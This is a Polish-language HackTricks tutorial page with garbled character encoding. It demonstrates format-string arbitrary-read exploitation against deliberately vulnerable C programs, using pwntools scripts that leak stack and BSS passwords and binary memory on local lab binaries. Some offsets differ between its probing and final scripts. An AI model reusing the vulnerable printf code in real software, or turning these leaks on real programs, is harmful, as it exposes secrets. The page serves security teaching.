# Format Strings - PrzykÅ‚ad odczytu arbitralnego

{% hint style="success" %}
Dowiedz siÄ™ i praktykuj Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Dowiedz siÄ™ i praktykuj Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **UdostÄ™pnij sztuczki hakerskie, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}

## Odczytaj PoczÄ…tek Binarny

### Kod
```c
#include <stdio.h>

int main(void) {
char buffer[30];

fgets(buffer, sizeof(buffer), stdin);

printf(buffer);
return 0;
}
```
Skompiluj to przy uÅ¼yciu:
```python
clang -o fs-read fs-read.c -Wno-format-security -no-pie
```
### Wykorzystanie
```python
from pwn import *

p = process('./fs-read')

payload = f"%11$s|||||".encode()
payload += p64(0x00400000)

p.sendline(payload)
log.info(p.clean())
```
* **PrzesuniÄ™cie wynosi 11**, poniewaÅ¼ ustawienie kilku liter A i **prÃ³bowanie siÅ‚owe** z pÄ™tlÄ… przesuniÄ™Ä‡ od 0 do 50 wykazaÅ‚o, Å¼e przy przesuniÄ™ciu 11 i dodatkowych 5 znakach (kreski pionowe `|` w naszym przypadku) moÅ¼na kontrolowaÄ‡ peÅ‚ny adres.
* UÅ¼yÅ‚em **`%11$p`** z dopeÅ‚nieniem, aÅ¼ zobaczyÅ‚em, Å¼e adres skÅ‚ada siÄ™ wyÅ‚Ä…cznie z 0x4141414141414141.
* **ÅaÅ„cuch formatujÄ…cy payload jest PRZED adresem**, poniewaÅ¼ **printf przestaje czytaÄ‡ na bajcie zerowym**, wiÄ™c jeÅ›li wyÅ›lemy najpierw adres, a nastÄ™pnie Å‚aÅ„cuch formatujÄ…cy, printf nigdy nie dotrze do Å‚aÅ„cucha formatujÄ…cego, poniewaÅ¼ wczeÅ›niej znajdzie bajt zerowy.
* Wybrany adres to 0x00400000, poniewaÅ¼ to tutaj zaczyna siÄ™ binarny plik (brak PIE)
```c
#include <stdio.h>
#include <string.h>

char bss_password[20] = "hardcodedPassBSS"; // Password in BSS

int main() {
char stack_password[20] = "secretStackPass"; // Password in stack
char input1[20], input2[20];

printf("Enter first password: ");
scanf("%19s", input1);

printf("Enter second password: ");
scanf("%19s", input2);

// Vulnerable printf
printf(input1);
printf("\n");

// Check both passwords
if (strcmp(input1, stack_password) == 0 && strcmp(input2, bss_password) == 0) {
printf("Access Granted.\n");
} else {
printf("Access Denied.\n");
}

return 0;
}
```
Skompiluj to przy uÅ¼yciu:
```bash
clang -o fs-read fs-read.c -Wno-format-security
```
### Odczytaj ze stosu

Zmienna **`stack_password`** zostanie przechowywana na stosie, poniewaÅ¼ jest zmiennÄ… lokalnÄ…, wiÄ™c wystarczy naduÅ¼yÄ‡ printf, aby pokazaÄ‡ zawartoÅ›Ä‡ stosu. To jest exploit do BF pierwszych 100 pozycji, aby ujawniÄ‡ hasÅ‚a ze stosu:
```python
from pwn import *

for i in range(100):
print(f"Try: {i}")
payload = f"%{i}$s\na".encode()
p = process("./fs-read")
p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
W obrazie moÅ¼na zobaczyÄ‡, Å¼e moÅ¼emy wyciec hasÅ‚o ze stosu na `10` pozycji:

<figure><img src="../../.gitbook/assets/image (1234).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1233).png" alt="" width="338"><figcaption></figcaption></figure>

### Odczytaj dane

UruchamiajÄ…c ten sam exploit, ale z `%p` zamiast `%s`, moÅ¼emy wyciec adres sterty ze stosu na `%25$p`. Ponadto, porÃ³wnujÄ…c wyciekÅ‚y adres (`0xaaaab7030894`) z pozycjÄ… hasÅ‚a w pamiÄ™ci w tym procesie, moÅ¼emy uzyskaÄ‡ rÃ³Å¼nicÄ™ adresÃ³w:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

Teraz nadszedÅ‚ czas, aby dowiedzieÄ‡ siÄ™, jak kontrolowaÄ‡ 1 adres na stosie, aby uzyskaÄ‡ do niego dostÄ™p z drugiej luki w ciÄ…gu znakÃ³w formatujÄ…cych:
```python
from pwn import *

def leak_heap(p):
p.sendlineafter(b"first password:", b"%5$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

for i in range(30):
p = process("./fs-read")

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

password_addr = heap_leak_addr - 0x126a

print(f"Try: {i}")
payload = f"%{i}$p|||".encode()
payload += b"AAAAAAAA"

p.sendline(payload)
output = p.clean()
print(output.decode("utf-8"))
p.close()
```
I jest moÅ¼liwe zobaczenie tego w **prÃ³bie 14** z uÅ¼ytym przekazywaniem, moÅ¼emy kontrolowaÄ‡ adres:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

### Wykorzystanie
```python
from pwn import *

p = process("./fs-read")

def leak_heap(p):
# At offset 25 there is a heap leak
p.sendlineafter(b"first password:", b"%25$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

# Offset calculated from the leaked position to the possition of the pass in memory
password_addr = heap_leak_addr + 0x1f7bc

print(f"Calculated address is: {hex(password_addr)}")

# At offset 14 we can control the addres, so use %s to read the string from that address
payload = f"%14$s|||".encode()
payload += p64(password_addr)

p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

{% hint style="success" %}
Naucz siÄ™ i praktykuj Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Szkolenie AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naucz siÄ™ i praktykuj Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Szkolenie GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **UdostÄ™pnij sztuczki hakerskie, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
